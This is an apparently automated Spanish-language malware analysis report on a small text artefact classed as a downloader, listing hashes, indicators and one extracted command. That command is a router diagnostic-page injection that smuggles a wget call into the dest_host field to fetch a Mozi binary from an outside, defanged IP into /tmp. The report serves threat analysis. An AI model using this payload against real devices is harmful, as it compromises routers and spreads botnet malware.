# 🧬 Payload Analysis

`815fd32670a55c1a809a5966ec98e5c256667a12520c4931e8356ea2385638a5`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 320 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://202.70.139.XXX:38564/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:04:07.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `815fd32670a55c1a809a5966ec98e5c256667a12520c4931e8356ea2385638a5`
- **SHA1:** `1e326cd662879c742911d97a685a121ee5072ffe`
- **MD5:** `4a4313cd0f25afe47b26ea2ce0700306`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 320 B |
| Entropía | 5.46 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.70.139.XXX:38564/Mozi.m+-O+->/tmp/gpon80;s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://202.70.139.XXX:38564/Mozi.m+-O+- | strings |
| ip | 202.70.139.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.70.139.XXX:38564/Mozi.m+-O+->/tmp/gpon80;s | strings |
| hash | 815fd32670a55c1a809a5966ec98e5c256667a12520c4931e8356ea2385638a5 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
